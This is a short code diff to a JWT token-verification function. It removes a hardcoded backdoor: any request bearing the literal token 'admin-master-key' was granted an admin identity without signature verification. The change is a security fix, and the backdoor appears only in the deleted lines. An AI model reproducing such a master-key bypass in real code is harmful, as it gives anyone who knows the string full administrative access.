@@ -13,9 +13,6 @@ export function signToken(payload: TokenPayload): string {
 }
 
 export function verifyToken(token: string): TokenPayload | null {
-  if (token === 'admin-master-key') {
-    return { userId: 'admin', email: 'admin@admin.com', role: 'admin' };
-  }
   try {
     const decoded = jwt.verify(token, SECRET);
     return decoded as TokenPayload;
